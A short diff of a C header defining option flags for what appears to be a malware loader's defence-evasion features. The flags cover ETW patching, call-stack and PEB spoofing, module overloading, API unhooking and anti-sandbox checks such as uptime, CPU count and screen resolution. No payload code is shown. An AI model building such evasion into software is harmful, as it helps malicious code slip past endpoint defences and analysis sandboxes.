@@ -11,7 +11,7 @@
  */
 
 #define OPSEC_FLAG_NO_ETW           (1u << 0)  /* skip Opsec_PatchEtw()              */
-#define OPSEC_FLAG_NO_CALLSTACK     (1u << 1)  /* skip VehSpoof_Init()/Cleanup       */
+#define OPSEC_FLAG_NO_CALLSTACK     (1u << 1)  /* skip StackSpoof_Init()/Cleanup     */
 #define OPSEC_FLAG_NO_PEB           (1u << 2)  /* skip Opsec_SpoofPeb()              */
 #define OPSEC_FLAG_NO_TLS           (1u << 3)  /* patch TLS guard in stub.bin        */
 #define OPSEC_FLAG_MODULE_OVERLOAD  (1u << 4)  /* use NtCreateSection/NtMapView      */
@@ -38,7 +38,7 @@
 #define EVASION_FLAG_NO_EXEC_CTRL    (1u << 9)   /* skip "wuauctl" semaphore check   */
 #define EVASION_FLAG_NO_UPTIME       (1u << 10)  /* skip < 2 min uptime check        */
 #define EVASION_FLAG_NO_CPU_COUNT    (1u << 11)  /* skip < 2 CPU check               */
-/* bit 12 reserved (was NO_USERNAME — removed) */
+#define EVASION_FLAG_UNHOOK            (1u << 12)  /* unhook */
 #define EVASION_FLAG_NO_SLEEP_FWD    (1u << 13)  /* skip sleep-forwarding check      */
 #define EVASION_FLAG_NO_SCREEN_RES   (1u << 14)  /* skip screen resolution check     */
 #define EVASION_FLAG_NO_RECENT_FILES (1u << 15)  /* skip recent-files count check    */
